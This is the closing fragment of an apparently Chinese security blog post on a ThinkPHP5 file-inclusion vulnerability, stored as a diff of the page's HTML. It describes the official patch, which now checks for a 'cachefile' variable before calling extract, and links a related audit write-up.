+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141536110.webp" alt="image-20240914153609828" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141536110.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141536110.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141536110.webp?size=large 2x" data-title="image-20240914153609828" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>再看一下官方是怎么修复的</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141540979.webp" alt="image-20240914154055878" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141540979.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141540979.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141540979.webp?size=large 2x" data-title="image-20240914154055878" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>原本是直接直接extract，现在是检查var里面有没有cachefile存在，然后再extract</p>
+<p>借用红日的图</p>
+<p><a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part2/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB7.md"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part2/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB7.md</a></p>
+<p><img loading="lazy" src="https://github.com/hongriSec/PHP-Audit-Labs/raw/master/Part2/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB7/7.png" alt="7" srcset="https://github.com/hongriSec/PHP-Audit-Labs/raw/master/Part2/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB7/7.png?size=small, https://github.com/hongriSec/PHP-Audit-Labs/raw/master/Part2/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB7/7.png?size=medium 1.5x, https://github.com/hongriSec/PHP-Audit-Labs/raw/master/Part2/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB7/7.png?size=large 2x" data-title="7" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-09-14 15:45:01">Updated on 2024-09-14&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-tag" title="Tags - 代码审计">代码审计</a><a href="/tags/php%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - Php安全">Php安全</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/rome%E9%93%BE/" class="post-nav-item" rel="prev" title="ROME链"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>ROME链</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
